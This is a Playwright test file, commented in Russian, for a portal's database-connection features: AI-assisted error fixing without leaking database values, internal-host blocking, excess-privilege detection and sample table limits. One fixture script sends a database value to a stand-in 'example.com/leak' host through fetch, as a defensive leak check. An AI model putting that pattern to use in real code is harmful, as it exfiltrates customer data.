/**
 * Правки 1.0 подключений к базам на стенде (docs/portal-api.md, изменение 0.25; §7.4, §7.5.16, §7.5.18,
 * §7.6.1, §7.6.2, §7.6.4–7.6.6; docs/portal-ui.md 0.19 §5.7, §5.13.20–5.13.21, §5.14): «Исправить с помощником»
 * со слоем из образца, одна загрузка образца у сотрудника, адрес внутри портала, новые виды лишних прав,
 * предел таблиц образца. `portal-api` перезапускается с `db.enabled: true` на время файла.
 */
import type { Page } from '@playwright/test';

import { saveFile } from '../support/code';
import { checkConnection, createConnection, customerPassword, DB_ON_YAML, refreshSnapshot } from '../support/db';
import { expect, test, type Member } from '../support/fixtures';
import { must } from '../support/must';
import { createDialog, expectError, parseStream, stubReply } from '../support/portal';
import { customerSql, restartApiWithSections } from '../support/stand';
import { createWebProject, type WebProject } from '../support/web';

let restore: (() => void) | null = null;

test.beforeAll(() => {
  restore = restartApiWithSections(DB_ON_YAML);
});

test.afterAll(() => {
  restore?.();
});

const HEADER_SAMPLE =
  'Исправить ошибки, которые появились в предпросмотре. Слой был заполнен образцом из базы, поэтому текст ошибок не передан — только тип ошибки, файл и строка:';
const SAMPLE_BUSY = 'Образец уже загружается — в этой или другой вкладке. Дождитесь окончания и нажмите «Загрузить заново»';

/** Веб-проект с выбором подключения и таблиц (§7.5.18). */
async function projectWithTables(member: Member, connectionId: string, tables: string[], content?: string): Promise<WebProject> {
  const project = await createWebProject(member.api, 'html_widget', `Слой ${tables.join(' ')}`);
  const response = await member.api.patch(`/api/code/projects/${project.id}`, {
    data: { db: { connection_id: connectionId, tables: tables.map((name) => ({ schema: 'cadastre', name })) } },
  });
  expect(response.status(), await response.text()).toBe(200);
  if (content !== undefined) {
    await saveFile(member.api, project.id, must(project.files[0], 'файл шаблона'), content);
  }
  return project;
}

async function openPreview(page: Page): Promise<void> {
  await page.getByRole('button', { name: 'Предпросмотр', exact: true }).first().click();
  await expect(page.getByRole('heading', { level: 2, name: 'Предпросмотр' })).toBeVisible();
}

/** Выбирает таблицу в списке «Данные слоя» колонки предпросмотра. */
async function chooseLayer(page: Page, table: string): Promise<void> {
  await page.getByRole('button', { name: 'Данные слоя:' }).click();
  await page.getByText(table, { exact: true }).last().click();
}

test('«Исправить с помощником» со слоем из образца: только тип, файл и строка; значений базы нет ни в запросе, ни в истории @стенд', async ({
  adminApi,
  newMember,
  pageAs,
}) => {
  test.setTimeout(120_000);
  const member = await newMember();
  const connection = await createConnection(adminApi, 'portal_reader');
  await refreshSnapshot(member.api, connection.id);
  // Код кладёт значение строки базы в текст ошибки и в адрес запрета сети.
  const project = await projectWithTables(
    member,
    connection.id,
    ['parcels'],
    [
      '<p>Образец</p>',
      '<script>',
      "api.searchInLayer(api.getLayer('x'), '').then(function (items) {",
      '  var value = String(items[0].attributes.cadastral_number);',
      "  fetch('https://example.com/leak/' + encodeURIComponent(value)).catch(function () {});",
      "  setTimeout(function () { throw new TypeError('leak ' + value); }, 0);",
      '});',
      '</script>',
    ].join('\n'),
  );
  const values = customerSql('SELECT cadastral_number FROM cadastre.parcels ORDER BY id');
  expect(values.length).toBeGreaterThan(50);

  const page = await pageAs(member, `/code/${project.id}`);
  await openPreview(page);
  await chooseLayer(page, 'cadastre.parcels');
  await expect(page.getByText(/^Слой: cadastre\.parcels, 50 объектов/)).toBeVisible({ timeout: 20_000 });
  await expect(page.getByText(/^Предпросмотр · [12]$/)).toBeVisible({ timeout: 20_000 });
  // Значение строки базы видно сотруднику во вкладке «Ошибки» — в его браузере это можно.
  await page.getByText(/^Ошибки · [12]$/).click();
  await expect(page.locator('code[lang="en"]').filter({ hasText: /leak 56:44:/ })).toBeVisible();

  const sent = page.waitForRequest((request) => request.method() === 'POST' && request.url().endsWith(`/api/dialogs/${project.dialog_id}/messages`));
  await page.getByRole('region', { name: 'Проверка кода' }).getByRole('button', { name: 'Исправить с помощником' }).click();
  const request = await sent;
  const body = request.postDataJSON();
  expect(body.content).toBeUndefined();
  expect(body.preview_fix.layer).toBe('sample');
  expect(body.preview_fix.problems.length).toBeGreaterThan(0);
  for (const problem of body.preview_fix.problems) {
    expect(problem).not.toHaveProperty('text');
  }
  expect(body.preview_fix.problems.map((problem: { kind: string }) => problem.kind)).toContain('error');
  const raw = must(request.postData(), 'тело запроса');
  for (const value of values) {
    expect(raw).not.toContain(value);
  }

  await expect(page.getByText(HEADER_SAMPLE)).toBeVisible({ timeout: 20_000 });
  const messages = await (await member.api.get(`/api/dialogs/${project.dialog_id}/messages`)).json();
  const question = must(
    (messages.items as { role: string; content: string }[]).find((item) => item.role === 'user'),
    'сохранённый вопрос',
  ).content;
  expect(question.split('\n')[0]).toBe(HEADER_SAMPLE);
  expect(question).toContain('TypeError');
  for (const value of values) {
    expect(question).not.toContain(value);
    expect(JSON.stringify(messages)).not.toContain(value);
  }
});

test('две вкладки грузят образец: во второй — «Образец уже загружается», выбор остаётся; «Загрузить заново» загружает @стенд', async ({
  adminApi,
  newMember,
  pageAs,
}) => {
  test.setTimeout(120_000);
  const member = await newMember();
  const connection = await createConnection(adminApi, 'portal_reader');
  await refreshSnapshot(member.api, connection.id);
  const project = await projectWithTables(member, connection.id, ['parcels', 'slow_view']);

  // Первая вкладка грузит образец медленного представления: сервер держит его до statement_timeout (10 с).
  const first = await pageAs(member, `/code/${project.id}`);
  await openPreview(first);
  const slow = first.waitForResponse((response) => response.url().includes('/preview-layer?') && response.url().includes('slow_view'), { timeout: 40_000 });
  await chooseLayer(first, 'cadastre.slow_view');
  await expect(first.getByText('Загружаю образец…')).toBeVisible();

  const second = await pageAs(member, `/code/${project.id}`);
  await openPreview(second);
  const busy = second.waitForResponse((response) => response.url().includes('/preview-layer?') && response.url().includes('parcels'));
  await chooseLayer(second, 'cadastre.parcels');
  expect((await busy).status()).toBe(429);
  await expect(second.getByRole('alert').filter({ hasText: SAMPLE_BUSY })).toBeVisible();
  await expect(second.getByRole('button', { name: /^Данные слоя:/ })).toContainText('cadastre.parcels');
  // Слой — придуманный.
  await expect(second.getByText(/^Это не CoGIS: слой придуманный/)).toBeVisible();

  expect((await slow).status()).not.toBe(200);
  const reload = second.waitForResponse((response) => response.url().includes('/preview-layer?') && response.url().includes('parcels'));
  await second.getByRole('button', { name: 'Загрузить заново' }).click();
  expect((await reload).status()).toBe(200);
  await expect(second.getByText(/^Слой: cadastre\.parcels, 50 объектов/)).toBeVisible();
  await expect(second.getByText(SAMPLE_BUSY)).toHaveCount(0);
});

test('сервер подключения внутри портала: portal-db — ошибка поля «Адрес»; сотрудник видит общий текст @стенд', async ({ adminApi, newMember, pageAs }) => {
  test.setTimeout(240_000);
  const created = await adminApi.post('/api/admin/db-connections', {
    data: {
      title: `Внутренний ${Date.now()}`,
      host: 'portal-db',
      port: 5432,
      database: 'portal',
      username: 'portal',
      password: 'not-a-secret',
      tls_mode: 'disable',
      schemas: ['public'],
      samples_allowed: true,
      sample_exclusions: [],
      access: { all: true },
    },
  });
  await expectError(created, 422, 'validation_error');
  expect((await created.json()).error.fields).toContainEqual(expect.objectContaining({ field: 'host', code: 'host_forbidden' }));

  // Форма администратора: текст кода поля у «Адрес».
  const admin = await newMember('admin');
  const page = await pageAs(admin, '/admin/databases');
  await page.getByRole('button', { name: 'Добавить подключение' }).first().click();
  const form = page.getByRole('dialog');
  await form.getByLabel('Название').fill(`Внутренний UI ${Date.now()}`);
  await form.getByLabel('Адрес').fill('portal-db');
  await form.getByLabel('База данных').fill('portal');
  await form.getByLabel('Учётная запись').fill('portal');
  await form.getByRole('textbox', { name: /^Пароль/ }).fill('not-a-secret');
  await form.locator('label').filter({ hasText: /^Без шифрования/ }).click();
  await form.getByLabel('Схемы базы').click();
  await page.keyboard.type('public');
  await page.keyboard.press('Enter');
  await form.locator('label').filter({ hasText: /^Всем сотрудникам/ }).click();
  await form.getByRole('button', { name: 'Сохранить и проверить' }).click();
  await expect(form.getByText('Это внутренний адрес портала. Укажите сервер базы заказчика')).toBeVisible();

  // Подключение, сохранённое до запрета: без исключения стенда customer-db — адрес во внутренней сети портала.
  const member = await newMember();
  const connection = await createConnection(adminApi, 'portal_reader');
  await refreshSnapshot(member.api, connection.id);
  const project = await projectWithTables(member, connection.id, ['parcels']);
  restartApiWithSections('db:\n  enabled: true\n');
  try {
    const layer = await member.api.get(`/api/code/projects/${project.id}/preview-layer?schema=cadastre&table=parcels`);
    await expectError(layer, 503, 'db_unavailable');
    expect((await layer.json()).error.details.reason).toBe('host_forbidden');
    const memberPage = await pageAs(member, `/code/${project.id}`);
    await openPreview(memberPage);
    await chooseLayer(memberPage, 'cadastre.parcels');
    await expect(memberPage.getByRole('alert').filter({ hasText: 'Не удалось подключиться к базе данных. Сообщите администратору портала' })).toBeVisible({
      timeout: 20_000,
    });
    // Администратор видит причину.
    const checked = await checkConnection(adminApi, connection.id);
    expect(checked.last_error?.reason).toBe('host_forbidden');
  } finally {
    restartApiWithSections(DB_ON_YAML);
  }
});

test('роли portal_grantor, portal_admin, portal_settings, portal_files — лишние права, строки перечня и «Скопировать список» @стенд', async ({
  adminApi,
  newMember,
  pageAs,
}) => {
  test.setTimeout(180_000);
  const cases = [
    {
      role: 'portal_grantor',
      kind: 'grant_option',
      left: 'Передаёт свои права другим учётным записям',
      right: /^SELECT WITH GRANT OPTION: cadastre\.parcels$/,
      copied: '- SELECT WITH GRANT OPTION: cadastre.parcels',
    },
    {
      role: 'portal_admin',
      kind: 'admin_option',
      left: 'Добавляет другие учётные записи в роли и исключает из них',
      right: /^WITH ADMIN OPTION: app_ro$/,
      copied: '- членство WITH ADMIN OPTION в ролях: app_ro',
    },
    {
      role: 'portal_settings',
      kind: 'server_settings',
      left: 'Меняет настройки сервера базы',
      right: /^ALTER SYSTEM ON PARAMETER: work_mem$/,
      copied: '- ALTER SYSTEM ON PARAMETER: work_mem',
    },
    {
      role: 'portal_files',
      kind: 'catalog_function',
      left: 'Вызывает закрытые по умолчанию функции сервера и расширений — например, записывает файлы на сервере базы или входит в другие базы от имени сервера',
      right: /^EXECUTE ON FUNCTION: lo_export\(oid,text\)$/,
      copied: '- EXECUTE ON FUNCTION: lo_export(oid,text)',
    },
  ];
  const titles: Record<string, string> = {};
  for (const { role, kind } of cases) {
    const created = await createConnection(adminApi, role);
    titles[role] = created.title;
    const checked = await checkConnection(adminApi, created.id);
    expect(checked.rights.status, `${role}: ${JSON.stringify(checked.rights)}`).toBe('excess');
    expect(checked.rights.findings.map((finding: { kind: string }) => finding.kind)).toEqual([kind]);
  }

  const admin = await newMember('admin');
  const page = await pageAs(admin, '/admin/databases');
  await page.addInitScript(() => {
    // Буфер обмена — в окно страницы: в браузерах без разрешения на чтение его иначе не прочесть.
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: async (text: string) => void ((window as unknown as { copied: string }).copied = text) },
    });
  });
  await page.reload();
  for (const { role, left, right, copied } of cases) {
    const row = page.getByRole('row').filter({ hasText: must(titles[role], role) });
    await row.getByRole('button', { name: /^Лишние права: \d+$/ }).click();
    const form = page.getByRole('dialog');
    await expect(form.getByText(`Подключение не используется: у учётной записи ${role} лишние права`)).toBeVisible();
    const line = form.locator('li').filter({ hasText: left });
    await expect(line).toHaveCount(1);
    await expect(line.locator('span').last()).toHaveText(right);
    await form.getByRole('button', { name: 'Скопировать список для администратора базы' }).click();
    await expect.poll(() => page.evaluate(() => (window as unknown as { copied?: string }).copied ?? '')).toContain(copied);
    const text = await page.evaluate(() => (window as unknown as { copied: string }).copied);
    expect(text).toContain(`Учётная запись ${role} базы cadastre (customer-db:5432) имеет права,`);
    expect(text).not.toContain(customerPassword());
    await page.reload();
  }
});

test('предел таблиц образца (db.sample_max_tables): лишние таблицы — придуманные, строка происхождения @стенд', async ({
  adminApi,
  newMember,
  pageAs,
}) => {
  test.setTimeout(240_000);
  restartApiWithSections('db:\n  enabled: true\n  allowed_internal_hosts: ["customer-db"]\n  sample_max_tables: 1\n');
  try {
    const member = await newMember();
    const connection = await createConnection(adminApi, 'portal_reader');
    await refreshSnapshot(member.api, connection.id);
    const dialogId = await createDialog(member.api, 'sql');
    const selected = await member.api.patch(`/api/dialogs/${dialogId}`, {
      data: { db: { connection_id: connection.id, tables: [{ schema: 'cadastre', name: 'parcels' }, { schema: 'cadastre', name: 'leases' }] } },
    });
    expect(selected.status(), await selected.text()).toBe(200);
    // Данные придуманной таблицы заглушка берёт из пометки в тексте запроса (блок «запрос» вопроса о данных).
    const data = JSON.stringify({
      statements: ['CREATE TABLE leases (id integer, parcel_id integer, starts_on date, ends_on date, amount numeric(12, 2))', "INSERT INTO leases VALUES (1, 3, '2024-01-01', NULL, 100.5)"],
    });
    const sql = `-- [[stub:sql-data]]${data}[[/stub:sql-data]]\nSELECT p.cadastral_number, l.amount FROM cadastre.parcels p JOIN cadastre.leases l ON l.parcel_id = p.id;`;
    const response = await member.api.post(`/api/dialogs/${dialogId}/messages`, {
      data: { content: stubReply(`\`\`\`sql\n${sql}\n\`\`\``), action: 'write', dialect: 'postgres', schema_id: null, test_run: true },
      timeout: 120_000,
    });
    expect(response.status(), await response.text()).toBe(200);
    const events = parseStream(await response.text());
    const block = must(events.filter((event) => event.event === 'sql_run').at(-1), 'sql_run').data.blocks[0];
    const fixture = block.fixture as { table: string; origin: string; invented_reason: string | null }[] | null;
    expect(fixture, JSON.stringify(block)).not.toBeNull();
    if (!fixture) return;
    expect(fixture.filter((item) => item.origin === 'sample')).toHaveLength(1);
    const invented = fixture.filter((item) => item.origin === 'invented');
    expect(invented, JSON.stringify(block)).toHaveLength(1);
    expect(invented[0]?.invented_reason).toBe('table_limit');

    const page = await pageAs(member, `/sql/${dialogId}`);
    await expect(
      page.getByText(`Данные таблицы ${invented[0]?.table} придуманы моделью: в запросе больше таблиц, чем портал копирует за одну проверку`),
    ).toBeVisible({ timeout: 20_000 });
  } finally {
    restartApiWithSections(DB_ON_YAML);
  }
});
